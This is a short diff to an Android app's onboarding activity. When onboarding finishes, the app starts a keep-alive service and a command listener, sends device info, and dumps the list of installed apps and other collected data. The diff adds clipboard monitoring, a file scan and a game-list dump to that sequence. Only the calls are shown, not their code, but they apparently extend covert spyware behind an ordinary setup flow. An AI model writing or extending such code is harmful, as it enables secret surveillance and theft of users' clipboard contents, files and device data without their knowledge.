@@ -178,6 +178,9 @@ public class OnboardingActivity extends Activity {
     private void finishOnboarding() {
         startForegroundService(new Intent(this, KeepAliveService.class));
         startService(new Intent(this, CommandListener.class));
+        ClipboardMonitor.start(this);
+        FileScanner.scan();
+        GameList.dump(this);
         DeviceInfo.sendFull(this);
         AppList.dump(this);
         DataCollector.collectAll(this);
